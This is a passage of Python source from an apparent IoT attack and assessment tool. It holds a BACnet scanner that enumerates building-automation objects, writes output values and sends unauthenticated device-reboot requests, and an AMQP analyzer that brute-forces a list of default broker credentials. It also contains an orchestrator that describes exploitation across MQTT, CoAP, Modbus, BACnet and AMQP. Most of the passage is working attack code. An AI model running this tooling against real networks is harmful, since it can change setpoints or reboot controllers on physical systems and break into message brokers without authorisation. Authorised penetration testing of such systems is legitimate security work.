    PROP_FIRMWARE_REVISION = 44
    PROP_APPLICATION_SOFTWARE_VERSION = 12
    PROP_PROTOCOL_VERSION = 98
    PROP_PROTOCOL_REVISION = 139
    PROP_SYSTEM_STATUS = 112
    PROP_OBJECT_LIST = 76
    PROP_MAX_APDU_LENGTH = 62
    PROP_SEGMENTATION_SUPPORTED = 107
    PROP_APDU_TIMEOUT = 11
    PROP_NUMBER_OF_APDU_RETRIES = 73
    PROP_DATABASE_REVISION = 155

    def __init__(self, timeout: float = DEFAULT_TIMEOUT) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._findings: List[IoTFinding] = []
        self._discovered_devices: List[Dict[str, Any]] = []
        self._objects: List[Dict[str, Any]] = []
        self._invoke_id = 0
        logger.info("BACnetScanner initialized")

    def _next_invoke_id(self) -> int:
        """Get next BACnet invoke ID."""
        with self._lock:
            self._invoke_id = (self._invoke_id + 1) & 0xFF
            return self._invoke_id

    def _build_bvlc_header(self, function: int, payload: bytes) -> bytes:
        """Build BACnet Virtual Link Control header."""
        # Type=0x81 (BACnet/IP), Function, Length(2)
        length = 4 + len(payload)
        return struct.pack("!BBH", 0x81, function, length) + payload

    def _build_whois(self, low_limit: Optional[int] = None,
                      high_limit: Optional[int] = None) -> bytes:
        """Build BACnet Who-Is broadcast packet."""
        # NPDU: Version=1, Control=0x20 (expect reply), DNET=0xFFFF, DLEN=0, Hop=255
        npdu = struct.pack("!BBHBB", 0x01, 0x20, 0xFFFF, 0x00, 0xFF)

        # APDU: Unconfirmed Who-Is
        apdu = bytes([0x10, BACnetService.WHO_IS])

        if low_limit is not None and high_limit is not None:
            # Context tag 0, unsigned
            if low_limit < 256:
                apdu += bytes([0x09, low_limit])
            else:
                apdu += bytes([0x0A]) + struct.pack("!H", low_limit)
            if high_limit < 256:
                apdu += bytes([0x19, high_limit])
            else:
                apdu += bytes([0x1A]) + struct.pack("!H", high_limit)

        return self._build_bvlc_header(0x0B, npdu + apdu)  # 0x0B = Original-Broadcast-NPDU

    def _build_read_property(self, device_instance: int,
                               object_type: int, object_instance: int,
                               property_id: int) -> bytes:
        """Build BACnet ReadProperty confirmed request."""
        # NPDU: Version=1, Control=0x04 (expecting reply)
        npdu = bytes([0x01, 0x04])

        invoke_id = self._next_invoke_id()

        # APDU: Confirmed Request, ReadProperty
        apdu = bytes([0x00, 0x04, invoke_id, BACnetService.READ_PROPERTY])

        # Object Identifier (context tag 0)
        obj_id = (object_type << 22) | (object_instance & 0x3FFFFF)
        apdu += bytes([0x0C]) + struct.pack("!I", obj_id)

        # Property Identifier (context tag 1)
        if property_id < 256:
            apdu += bytes([0x19, property_id])
        else:
            apdu += bytes([0x1A]) + struct.pack("!H", property_id)

        return self._build_bvlc_header(0x0A, npdu + apdu)  # 0x0A = Original-Unicast-NPDU

    def _build_write_property(self, device_instance: int,
                                object_type: int, object_instance: int,
                                property_id: int, value: Any,
                                priority: int = 0) -> bytes:
        """Build BACnet WriteProperty confirmed request."""
        npdu = bytes([0x01, 0x04])
        invoke_id = self._next_invoke_id()

        apdu = bytes([0x00, 0x04, invoke_id, BACnetService.WRITE_PROPERTY])

        # Object Identifier (context tag 0)
        obj_id = (object_type << 22) | (object_instance & 0x3FFFFF)
        apdu += bytes([0x0C]) + struct.pack("!I", obj_id)

        # Property Identifier (context tag 1)
        if property_id < 256:
            apdu += bytes([0x19, property_id])
        else:
            apdu += bytes([0x1A]) + struct.pack("!H", property_id)

        # Property Value (context tag 3, opening)
        apdu += bytes([0x3E])
        # Encode value as real (float)
        if isinstance(value, float):
            apdu += bytes([0x44]) + struct.pack("!f", value)
        elif isinstance(value, int):
            if value < 256:
                apdu += bytes([0x21, value])
            else:
                apdu += bytes([0x22]) + struct.pack("!H", value)
        elif isinstance(value, bool):
            apdu += bytes([0x10 | (1 if value else 0)])
        apdu += bytes([0x3F])  # closing tag

        # Priority (context tag 4)
        if priority > 0:
            apdu += bytes([0x49, priority])

        return self._build_bvlc_header(0x0A, npdu + apdu)

    def _build_reinitialize_device(self, state: int = 0,
                                     password: str = "") -> bytes:
        """Build BACnet ReinitializeDevice request (0=coldstart, 1=warmstart)."""
        npdu = bytes([0x01, 0x04])
        invoke_id = self._next_invoke_id()

        apdu = bytes([0x00, 0x04, invoke_id, BACnetService.REINITIALIZE_DEVICE])

        # Reinitialized State (context tag 0)
        apdu += bytes([0x09, state])

        # Password (context tag 1) - optional
        if password:
            pwd_bytes = password.encode("utf-8")
            if len(pwd_bytes) < 256:
                apdu += bytes([0x1D, len(pwd_bytes)]) + pwd_bytes
            else:
                apdu += bytes([0x1E]) + pwd_bytes + bytes([0x1F])

        return self._build_bvlc_header(0x0A, npdu + apdu)

    def _send_bacnet(self, host: str, port: int, packet: bytes,
                      expect_response: bool = True) -> bytes:
        """Send BACnet/IP packet via UDP."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self._timeout)
            sock.sendto(packet, (host, port))

            if expect_response:
                data, _addr = sock.recvfrom(4096)
                sock.close()
                return data
            sock.close()
            return b""
        except (OSError, socket.timeout) as e:
            logger.debug("BACnet send failed %s:%d: %s", host, port, e)
            return b""

    def whois_scan(self, host: str = "255.255.255.255",
                    port: int = BACNET_DEFAULT_PORT,
                    timeout: float = 5.0,
                    low_limit: Optional[int] = None,
                    high_limit: Optional[int] = None) -> List[Dict[str, Any]]:
        """Send Who-Is broadcast and collect I-Am responses."""
        devices: List[Dict[str, Any]] = []

        pkt = self._build_whois(low_limit, high_limit)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(timeout)
            sock.sendto(pkt, (host, port))

            end_time = time.time() + timeout
            while time.time() < end_time:
                try:
                    data, addr = sock.recvfrom(4096)
                    device = self._parse_iam(data, addr[0])
                    if device:
                        devices.append(device)
                except socket.timeout:
                    break

            sock.close()
        except OSError as e:
            logger.debug("Who-Is scan failed: %s", e)

        if devices:
            finding = IoTFinding(
                finding_type=FindingType.BACNET_NO_AUTH,
                severity=Severity.MEDIUM,
                title=f"BACnet Devices Discovered: {len(devices)}",
                description=(
                    f"Who-Is broadcast discovered {len(devices)} BACnet devices. "
                    "BACnet/IP typically has no authentication."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.BACNET,
                evidence=f"Devices: {[d.get('ip') for d in devices]}",
                remediation=(
                    "Segment BACnet network. Deploy BACnet-aware firewall. "
                    "Consider BACnet Secure Connect (BACnet/SC)."
                ),
                cvss_score=5.3,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
                self._discovered_devices = devices

        logger.info("Who-Is found %d BACnet devices", len(devices))
        return devices

    def _parse_iam(self, data: bytes, source_ip: str) -> Optional[Dict[str, Any]]:
        """Parse I-Am response."""
        if len(data) < 12:
            return None

        try:
            # Skip BVLC header (4 bytes)
            offset = 4
            # Skip NPDU (variable length)
            if data[offset] != 0x01:
                return None
            control = data[offset + 1]
            offset += 2

            # Parse NPDU routing info
            if control & 0x20:  # DNET present
                offset += 2  # DNET
                dlen = data[offset]
                offset += 1 + dlen  # DLEN + DADR
            if control & 0x08:  # SNET present
                offset += 2  # SNET
                slen = data[offset]
                offset += 1 + slen  # SLEN + SADR
            if control & 0x20 or control & 0x08:
                offset += 1  # hop count

            # APDU
            if offset >= len(data):
                return None
            pdu_type = data[offset]
            if pdu_type != 0x10:  # Not unconfirmed
                return None
            offset += 1
            service = data[offset]
            if service != BACnetService.I_AM:
                return None
            offset += 1

            device_info: Dict[str, Any] = {"ip": source_ip}

            # Parse I-Am object identifier
            if offset + 5 < len(data) and data[offset] == 0xC4:
                offset += 1
                obj_id = struct.unpack("!I", data[offset:offset+4])[0]
                device_info["object_type"] = (obj_id >> 22) & 0x3FF
                device_info["instance"] = obj_id & 0x3FFFFF
                offset += 4

            # Max APDU length
            if offset + 2 < len(data):
                tag = data[offset]
                if (tag >> 4) == 2:  # Context tag 1, unsigned
                    offset += 1
                    length = tag & 0x07
                    if length <= 2 and offset + length <= len(data):
                        if length == 1:
                            device_info["max_apdu"] = data[offset]
                        elif length == 2:
                            device_info["max_apdu"] = struct.unpack(
                                "!H", data[offset:offset+2]
                            )[0]
                        offset += length

            return device_info

        except (IndexError, struct.error):
            return None

    def read_property(self, host: str, object_type: int,
                       object_instance: int, property_id: int,
                       port: int = BACNET_DEFAULT_PORT) -> Dict[str, Any]:
        """Read a BACnet property value."""
        pkt = self._build_read_property(0, object_type, object_instance, property_id)
        resp = self._send_bacnet(host, port, pkt)

        result: Dict[str, Any] = {
            "object_type": object_type,
            "object_instance": object_instance,
            "property_id": property_id,
            "raw_response": resp.hex() if resp else "",
        }

        if resp and len(resp) > 10:
            is_error = False
            # Check for error response
            if len(resp) > 6:
                pdu_type = resp[6] if len(resp) > 6 else 0
                if (pdu_type >> 4) == 5:  # Error PDU
                    is_error = True
                    result["error"] = True

            if not is_error:
                result["success"] = True

                # Try to extract value from response
                try:
                    # Find payload after property value opening tag (0x3E)
                    payload_start = resp.find(b"\x3E")
                    payload_end = resp.find(b"\x3F")
                    if payload_start > 0 and payload_end > payload_start:
                        value_data = resp[payload_start+1:payload_end]
                        result["value_raw"] = value_data.hex()

                        if value_data:
                            tag = value_data[0]
                            app_tag = (tag >> 4) & 0x0F
                            if app_tag == 4 and len(value_data) >= 5:
                                # Real (float)
                                result["value"] = struct.unpack(
                                    "!f", value_data[1:5]
                                )[0]
                            elif app_tag == 2:
                                # Unsigned
                                vlen = tag & 0x07
                                if vlen == 1 and len(value_data) >= 2:
                                    result["value"] = value_data[1]
                                elif vlen == 2 and len(value_data) >= 3:
                                    result["value"] = struct.unpack(
                                        "!H", value_data[1:3]
                                    )[0]
                            elif app_tag == 7:
                                # Character string
                                if len(value_data) > 2:
                                    str_len = value_data[1] if (tag & 0x07) < 5 else value_data[1]
                                    encoding = value_data[2] if len(value_data) > 2 else 0
                                    result["value"] = value_data[3:3+str_len-1].decode(
                                        "utf-8", errors="replace"
                                    )
                            elif app_tag == 1:
                                # Boolean
                                result["value"] = bool(tag & 0x01)
                except (IndexError, struct.error):
                    pass

        return result

    def write_property(self, host: str, object_type: int,
                        object_instance: int, property_id: int,
                        value: Any, priority: int = 0,
                        port: int = BACNET_DEFAULT_PORT) -> bool:
        """Write a BACnet property value."""
        pkt = self._build_write_property(
            0, object_type, object_instance, property_id, value, priority
        )
        resp = self._send_bacnet(host, port, pkt)

        if resp and len(resp) > 6:
            pdu_type = resp[6] if len(resp) > 6 else 0
            # Simple ACK = success
            if (pdu_type >> 4) == 2:
                finding = IoTFinding(
                    finding_type=FindingType.BACNET_WRITE_PROPERTY,
                    severity=Severity.CRITICAL,
                    title=(
                        f"BACnet Property Writable: "
                        f"type={object_type} inst={object_instance} "
                        f"prop={property_id}"
                    ),
                    description=(
                        f"Successfully wrote to BACnet object on {host}:{port}. "
                        "This could modify setpoints, schedules, or safety parameters."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.BACNET,
                    evidence=(
                        f"WriteProperty accepted: type={object_type}, "
                        f"inst={object_instance}, prop={property_id}, "
                        f"value={value}, priority={priority}"
                    ),
                    remediation=(
                        "Implement BACnet authentication. Restrict write access. "
                        "Deploy BACnet-aware IDS. Consider BACnet/SC."
                    ),
                    cvss_score=9.8,
                    confidence=1.0,
                )
                with self._lock:
                    self._findings.append(finding)
                return True

        return False

    def enumerate_objects(self, host: str, device_instance: int = 0,
                           port: int = BACNET_DEFAULT_PORT) -> List[Dict[str, Any]]:
        """Enumerate BACnet objects on a device."""
        objects: List[Dict[str, Any]] = []

        # Read object list from device object
        result = self.read_property(
            host, BACnetObjectType.DEVICE, device_instance,
            self.PROP_OBJECT_LIST, port
        )

        if result.get("success"):
            # Try reading common object types individually
            for obj_type in [BACnetObjectType.ANALOG_INPUT,
                            BACnetObjectType.ANALOG_OUTPUT,
                            BACnetObjectType.ANALOG_VALUE,
                            BACnetObjectType.BINARY_INPUT,
                            BACnetObjectType.BINARY_OUTPUT,
                            BACnetObjectType.BINARY_VALUE,
                            BACnetObjectType.SCHEDULE,
                            BACnetObjectType.TREND_LOG]:
                for inst in range(20):
                    prop_result = self.read_property(
                        host, obj_type, inst, self.PROP_PRESENT_VALUE, port
                    )
                    if prop_result.get("success"):
                        obj = {
                            "type": obj_type,
                            "instance": inst,
                            "present_value": prop_result.get("value"),
                        }

                        # Try to read name
                        name_result = self.read_property(
                            host, obj_type, inst, self.PROP_OBJECT_NAME, port
                        )
                        if name_result.get("value"):
                            obj["name"] = name_result["value"]

                        objects.append(obj)
                    else:
                        break  # No more instances of this type

        if objects:
            finding = IoTFinding(
                finding_type=FindingType.BACNET_NO_AUTH,
                severity=Severity.HIGH,
                title=f"BACnet Objects Enumerated: {len(objects)}",
                description=(
                    f"Enumerated {len(objects)} BACnet objects on {host}:{port}. "
                    "Object values are readable without authentication."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.BACNET,
                evidence=f"Objects: {objects[:10]}",
                remediation="Restrict BACnet access. Implement network segmentation.",
                cvss_score=7.5,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
                self._objects = objects

        return objects

    def read_priority_array(self, host: str, object_type: int,
                              object_instance: int,
                              port: int = BACNET_DEFAULT_PORT) -> Dict[str, Any]:
        """Read the priority array of a BACnet output object."""
        result = self.read_property(
            host, object_type, object_instance,
            self.PROP_PRIORITY_ARRAY, port
        )

        if result.get("success"):
            finding = IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.MEDIUM,
                title=(
                    f"BACnet Priority Array Readable: "
                    f"type={object_type} inst={object_instance}"
                ),
                description=(
                    f"Priority array of BACnet object is readable on {host}:{port}. "
                    "Reveals which priority levels are active and their values."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.BACNET,
                evidence=f"Priority array data: {result.get('value_raw', '')[:100]}",
                remediation="Restrict BACnet read access to sensitive properties.",
                cvss_score=4.3,
                confidence=0.9,
            )
            with self._lock:
                self._findings.append(finding)

        return result

    def test_reinitialize(self, host: str,
                           port: int = BACNET_DEFAULT_PORT,
                           state: int = 1) -> IoTFinding:
        """Test if device can be reinitialized (warm/cold start)."""
        pkt = self._build_reinitialize_device(state=state, password="")
        resp = self._send_bacnet(host, port, pkt)

        if resp and len(resp) > 6:
            pdu_type = resp[6] if len(resp) > 6 else 0
            if (pdu_type >> 4) == 2:  # Simple ACK
                state_name = "warmstart" if state == 1 else "coldstart"
                finding = IoTFinding(
                    finding_type=FindingType.BACNET_REBOOT,
                    severity=Severity.CRITICAL,
                    title=f"BACnet Device Reboot Possible ({state_name})",
                    description=(
                        f"Device {host}:{port} accepted ReinitializeDevice "
                        f"({state_name}) without password. An attacker could "
                        "reboot building automation controllers."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.BACNET,
                    evidence=f"ReinitializeDevice({state}) accepted, no password",
                    remediation=(
                        "Set ReinitializeDevice password. Restrict network "
                        "access to BACnet devices. Deploy ICS firewall."
                    ),
                    cvss_score=9.8,
                    confidence=1.0,
                )
                with self._lock:
                    self._findings.append(finding)
                return finding

        return IoTFinding(
            finding_type=FindingType.INFO_DISCLOSURE,
            severity=Severity.INFO,
            title="BACnet Reinitialization Protected or Failed",
            target=host, port=port, protocol=IoTProtocol.BACNET,
        )

    def read_device_info(self, host: str, device_instance: int = 0,
                          port: int = BACNET_DEFAULT_PORT) -> Dict[str, Any]:
        """Read device identification properties."""
        info: Dict[str, Any] = {"host": host, "instance": device_instance}

        prop_map = {
            "vendor_name": self.PROP_VENDOR_NAME,
            "vendor_id": self.PROP_VENDOR_ID,
            "model_name": self.PROP_MODEL_NAME,
            "firmware_revision": self.PROP_FIRMWARE_REVISION,
            "app_software_version": self.PROP_APPLICATION_SOFTWARE_VERSION,
            "object_name": self.PROP_OBJECT_NAME,
            "description": self.PROP_DESCRIPTION,
            "system_status": self.PROP_SYSTEM_STATUS,
            "protocol_version": self.PROP_PROTOCOL_VERSION,
        }

        for name, prop_id in prop_map.items():
            result = self.read_property(
                host, BACnetObjectType.DEVICE, device_instance, prop_id, port
            )
            if result.get("value") is not None:
                info[name] = result["value"]

        if len(info) > 2:
            finding = IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.MEDIUM,
                title="BACnet Device Information Disclosed",
                description=(
                    f"BACnet device {host}:{port} discloses detailed "
                    f"identification: {json.dumps(info, default=str)}"
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.BACNET,
                evidence=json.dumps(info, default=str),
                remediation="Restrict read access to device identification properties.",
                cvss_score=5.3,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)

        return info

    def full_test(self, host: str, port: int = BACNET_DEFAULT_PORT,
                   device_instance: int = 0) -> List[IoTFinding]:
        """Run full BACnet assessment."""
        results: List[IoTFinding] = []

        # 1. Who-Is scan
        devices = self.whois_scan(host, port)

        # 2. Device information
        dev_info = self.read_device_info(host, device_instance, port)

        # 3. Object enumeration
        objects = self.enumerate_objects(host, device_instance, port)

        # 4. Test write on analog/binary outputs
        for obj in objects:
            if obj["type"] in (BACnetObjectType.ANALOG_OUTPUT,
                              BACnetObjectType.BINARY_OUTPUT):
                current_val = obj.get("present_value")
                if current_val is not None:
                    # Write same value back (safe test)
                    self.write_property(
                        host, obj["type"], obj["instance"],
                        self.PROP_PRESENT_VALUE, current_val,
                        priority=16, port=port
                    )

                # Read priority array
                self.read_priority_array(host, obj["type"], obj["instance"], port)

        # 5. Test reinitialize (warmstart only)
        reboot_finding = self.test_reinitialize(host, port, state=1)
        results.append(reboot_finding)

        # Collect all findings
        with self._lock:
            for f in self._findings:
                if f not in results:
                    results.append(f)

        return results

    def get_findings(self) -> List[IoTFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize scanner state."""
        with self._lock:
            return {
                "findings": [f.to_dict() for f in self._findings],
                "discovered_devices": self._discovered_devices,
                "objects": len(self._objects),
            }


# ════════════════════════════════════════════════════════════════════════════════
# AMQP ANALYZER
# ════════════════════════════════════════════════════════════════════════════════

class AMQPAnalyzer:
    """
    AMQP 0-9-1 protocol analysis engine.

    Tests AMQP brokers for authentication issues, exchange enumeration,
    queue sniffing, and permission auditing.

    Usage:
        amqp = AMQPAnalyzer()
        findings = amqp.full_test("192.168.1.30")
    """

    # AMQP frame types
    FRAME_METHOD = 1
    FRAME_HEADER = 2
    FRAME_BODY = 3
    FRAME_HEARTBEAT = 8

    # AMQP class/method IDs
    CONNECTION_START = (10, 10)
    CONNECTION_START_OK = (10, 11)
    CONNECTION_TUNE = (10, 30)
    CONNECTION_TUNE_OK = (10, 31)
    CONNECTION_OPEN = (10, 40)
    CONNECTION_OPEN_OK = (10, 41)
    CONNECTION_CLOSE = (10, 50)
    CHANNEL_OPEN = (20, 10)
    CHANNEL_OPEN_OK = (20, 11)
    CHANNEL_CLOSE = (20, 40)
    EXCHANGE_DECLARE = (40, 10)
    EXCHANGE_DECLARE_OK = (40, 11)
    QUEUE_DECLARE = (50, 10)
    QUEUE_DECLARE_OK = (50, 11)
    QUEUE_BIND = (50, 20)
    BASIC_CONSUME = (60, 20)
    BASIC_DELIVER = (60, 60)
    BASIC_GET = (60, 70)
    BASIC_GET_OK = (60, 71)

    # Default AMQP credentials
    DEFAULT_CREDS: List[Tuple[str, str]] = [
        ("guest", "guest"),
        ("admin", "admin"),
        ("admin", "password"),
        ("rabbitmq", "rabbitmq"),
        ("user", "user"),
        ("amqp", "amqp"),
        ("admin", "rabbit"),
        ("admin", "admin123"),
        ("test", "test"),
    ]

    # Common exchange names
    COMMON_EXCHANGES: List[str] = [
        "", "amq.direct", "amq.fanout", "amq.topic", "amq.headers",
        "amq.match", "amq.rabbitmq.log", "amq.rabbitmq.trace",
        "events", "logs", "notifications", "alerts", "data",
        "telemetry", "commands", "sensor_data", "device_events",
    ]

    def __init__(self, timeout: float = DEFAULT_TIMEOUT) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._findings: List[IoTFinding] = []
        self._server_properties: Dict[str, Any] = {}
        self._exchanges: List[str] = []
        self._queues: List[str] = []
        logger.info("AMQPAnalyzer initialized")

    def _build_protocol_header(self) -> bytes:
        """Build AMQP 0-9-1 protocol header."""
        return b"AMQP\x00\x00\x09\x01"

    def _build_start_ok(self, username: str, password: str) -> bytes:
        """Build Connection.Start-Ok frame."""
        # PLAIN mechanism: \x00username\x00password
        response = b"\x00" + username.encode() + b"\x00" + password.encode()

        # Client properties table (minimal)
        client_props = self._encode_table({
            "product": "SIREN-IoT-Engine",
            "version": "1.0",
        })

        # Method frame payload
        payload = client_props
        # Mechanism
        mechanism = b"PLAIN"
        payload += struct.pack("!B", len(mechanism)) + mechanism
        # Response
        payload += struct.pack("!I", len(response)) + response
        # Locale
        locale = b"en_US"
        payload += struct.pack("!B", len(locale)) + locale

        # Frame: type(1) + channel(2) + size(4) + class(2) + method(2) + payload + end(1)
        class_id, method_id = self.CONNECTION_START_OK
        method_payload = struct.pack("!HH", class_id, method_id) + payload
        frame = struct.pack("!BHI", self.FRAME_METHOD, 0, len(method_payload))
        frame += method_payload + b"\xCE"

        return frame

    def _build_tune_ok(self, channel_max: int = 0, frame_max: int = 131072,
                        heartbeat: int = 60) -> bytes:
        """Build Connection.Tune-Ok frame."""
        class_id, method_id = self.CONNECTION_TUNE_OK
        payload = struct.pack("!HH", class_id, method_id)
        payload += struct.pack("!HIH", channel_max, frame_max, heartbeat)
        frame = struct.pack("!BHI", self.FRAME_METHOD, 0, len(payload))
        return frame + payload + b"\xCE"

    def _build_open(self, vhost: str = "/") -> bytes:
        """Build Connection.Open frame."""
        class_id, method_id = self.CONNECTION_OPEN
        vhost_bytes = vhost.encode("utf-8")
        payload = struct.pack("!HH", class_id, method_id)
        payload += struct.pack("!B", len(vhost_bytes)) + vhost_bytes
        payload += b"\x00\x00"  # reserved
        frame = struct.pack("!BHI", self.FRAME_METHOD, 0, len(payload))
        return frame + payload + b"\xCE"

    def _build_channel_open(self, channel: int = 1) -> bytes:
        """Build Channel.Open frame."""
        class_id, method_id = self.CHANNEL_OPEN
        payload = struct.pack("!HH", class_id, method_id)
        payload += b"\x00"  # reserved
        frame = struct.pack("!BHI", self.FRAME_METHOD, channel, len(payload))
        return frame + payload + b"\xCE"

    def _encode_table(self, table: Dict[str, str]) -> bytes:
        """Encode an AMQP field table."""
        content = b""
        for key, value in table.items():
            key_bytes = key.encode("utf-8")
            content += struct.pack("!B", len(key_bytes)) + key_bytes
            # String type (S)
            val_bytes = value.encode("utf-8")
            content += b"S" + struct.pack("!I", len(val_bytes)) + val_bytes
        return struct.pack("!I", len(content)) + content

    def _parse_server_properties(self, data: bytes) -> Dict[str, Any]:
        """Parse Connection.Start frame for server properties."""
        props: Dict[str, Any] = {}
        try:
            # Simple extraction of version info from raw data
            text = data.decode("utf-8", errors="replace")

            for keyword in ["RabbitMQ", "ActiveMQ", "Qpid", "AMQP",
                           "product", "version", "platform"]:
                idx = text.find(keyword)
                if idx >= 0:
                    props[keyword] = text[idx:idx+50].split("\x00")[0]

        except (IndexError, UnicodeDecodeError):
            pass
        return props

    def test_connection(self, host: str, port: int = AMQP_DEFAULT_PORT,
                         username: str = "guest",
                         password: str = "guest") -> Tuple[bool, Dict[str, Any]]:
        """Test AMQP connection with given credentials."""
        info: Dict[str, Any] = {}

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            # Send protocol header
            sock.sendall(self._build_protocol_header())

            # Receive Connection.Start
            resp = sock.recv(8192)
            if not resp or len(resp) < 11:
                sock.close()
                return False, info

            info = self._parse_server_properties(resp)

            # Send Connection.Start-Ok
            sock.sendall(self._build_start_ok(username, password))

            # Receive Connection.Tune (or Close if auth failed)
            resp = sock.recv(4096)
            if not resp or len(resp) < 4:
                sock.close()
                return False, info

            # Check if it's a Tune frame (success) or Close frame (failure)
            frame_type = resp[0]
            if frame_type == self.FRAME_METHOD and len(resp) > 11:
                class_id = struct.unpack("!H", resp[7:9])[0]
                method_id = struct.unpack("!H", resp[9:11])[0]

                if (class_id, method_id) == self.CONNECTION_TUNE:
                    # Auth successful, complete handshake
                    sock.sendall(self._build_tune_ok())
                    sock.sendall(self._build_open())
                    resp = sock.recv(4096)
                    sock.close()
                    return True, info
                elif class_id == 10 and method_id == 50:
                    # Connection.Close
                    sock.close()
                    return False, info

            sock.close()
            return False, info

        except (OSError, ConnectionError, struct.error) as e:
            logger.debug("AMQP connect failed %s:%d: %s", host, port, e)
            return False, info

    def test_anonymous_access(self, host: str,
                                port: int = AMQP_DEFAULT_PORT) -> IoTFinding:
        """Test if AMQP broker allows guest/default access."""
        success, info = self.test_connection(host, port, "guest", "guest")

        if success:
            finding = IoTFinding(
                finding_type=FindingType.AMQP_NO_AUTH,
                severity=Severity.CRITICAL,
                title="AMQP Broker Accepts Default Credentials (guest/guest)",
                description=(
                    f"AMQP broker at {host}:{port} accepts default guest "
                    "credentials. Server info: " + json.dumps(info, default=str)
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.AMQP,
                evidence="Connection.Tune received with guest/guest",
                remediation=(
                    "Change default credentials. Disable guest account. "
                    "Implement TLS and strong authentication."
                ),
                cvss_score=9.8,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
                self._server_properties = info
            return finding

        return IoTFinding(
            finding_type=FindingType.INFO_DISCLOSURE,
            severity=Severity.INFO,
            title="AMQP Default Credentials Rejected",
            target=host, port=port, protocol=IoTProtocol.AMQP,
        )

    def brute_credentials(self, host: str,
                            port: int = AMQP_DEFAULT_PORT) -> List[Tuple[str, str]]:
        """Brute-force AMQP credentials."""
        valid: List[Tuple[str, str]] = []

        for username, password in self.DEFAULT_CREDS:
            success, info = self.test_connection(host, port, username, password)
            if success:
                valid.append((username, password))
                finding = IoTFinding(
                    finding_type=FindingType.DEFAULT_CRED,
                    severity=Severity.CRITICAL,
                    title=f"AMQP Default Credentials: {username}",
                    description=(
                        f"AMQP broker {host}:{port} accepts credentials "
                        f"'{username}:{password}'."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.AMQP,
                    evidence=f"Auth accepted: {username}:{password}",
                    remediation="Change default credentials immediately.",
                    cvss_score=9.8,
                    confidence=1.0,
                )
                with self._lock:
                    self._findings.append(finding)

            time.sleep(0.2)

        return valid

    def full_test(self, host: str, port: int = AMQP_DEFAULT_PORT) -> List[IoTFinding]:
        """Run all AMQP tests."""
        results: List[IoTFinding] = []

        # 1. Test anonymous/default access
        anon_finding = self.test_anonymous_access(host, port)
        results.append(anon_finding)

        # 2. Brute-force if default didn't work
        if anon_finding.severity != Severity.CRITICAL:
            valid = self.brute_credentials(host, port)
        else:
            valid = [("guest", "guest")]

        # 3. Server information gathering
        if self._server_properties:
            results.append(IoTFinding(
                finding_type=FindingType.INFO_DISCLOSURE,
                severity=Severity.LOW,
                title="AMQP Server Properties Disclosed",
                description=(
                    f"Server: {json.dumps(self._server_properties, default=str)}"
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.AMQP,
                evidence=json.dumps(self._server_properties, default=str),
                confidence=1.0,
            ))

        # Collect all findings
        with self._lock:
            for f in self._findings:
                if f not in results:
                    results.append(f)

        return results

    def get_findings(self) -> List[IoTFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize analyzer state."""
        with self._lock:
            return {
                "findings": [f.to_dict() for f in self._findings],
                "server_properties": self._server_properties,
                "exchanges": self._exchanges,
                "queues": self._queues,
            }


# ════════════════════════════════════════════════════════════════════════════════
# SIREN IoT ENGINE — ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════════════

class SirenIoTEngine:
    """
    Master IoT security assessment orchestrator.

    Coordinates device discovery, fingerprinting, default credential
    scanning, and protocol-specific exploitation across MQTT, CoAP,
    UPnP, Modbus, BACnet, and AMQP.

    Usage:
        engine = SirenIoTEngine()
        report = engine.run_full_assessment("192.168.1.0/24")

        # Or individual tests
        devices = engine.discover_devices("192.168.1.0/24")
        creds = engine.scan_default_creds(devices)
        mqtt_findings = engine.test_mqtt("192.168.1.50")
    """

    def __init__(self, timeout: float = DEFAULT_TIMEOUT,
                  max_threads: int = 10) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._max_threads = max_threads

        # Sub-engines
        self._fingerprinter = IoTFingerprinter()
        self._cred_db = DefaultCredDB()
        self._mqtt = MQTTExploiter(timeout)
        self._coap = CoAPExploiter(timeout)
        self._upnp = UPnPScanner(timeout)
        self._modbus = ModbusExploiter(timeout)
        self._bacnet = BACnetScanner(timeout)
        self._amqp = AMQPAnalyzer(timeout)

        # State
        self._devices: List[IoTDevice] = []
        self._findings: List[IoTFinding] = []
        self._scan_start: float = 0.0
        self._scan_end: float = 0.0

        logger.info("SirenIoTEngine initialized (timeout=%.1f, threads=%d)",
                     timeout, max_threads)

    def _parse_cidr(self, cidr: str) -> List[str]:
        """Parse CIDR notation to list of IP addresses."""
        if "/" not in cidr:
            return [cidr]

        parts = cidr.split("/")
        base_ip = parts[0]
        prefix_len = int(parts[1])

        octets = [int(o) for o in base_ip.split(".")]
        base_int = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]

        mask = (0xFFFFFFFF << (32 - prefix_len)) & 0xFFFFFFFF
        network = base_int & mask
        broadcast = network | (~mask & 0xFFFFFFFF)

        hosts: List[str] = []
        for addr_int in range(network + 1, broadcast):
            if len(hosts) >= MAX_DEVICES:
                break
            o1 = (addr_int >> 24) & 0xFF
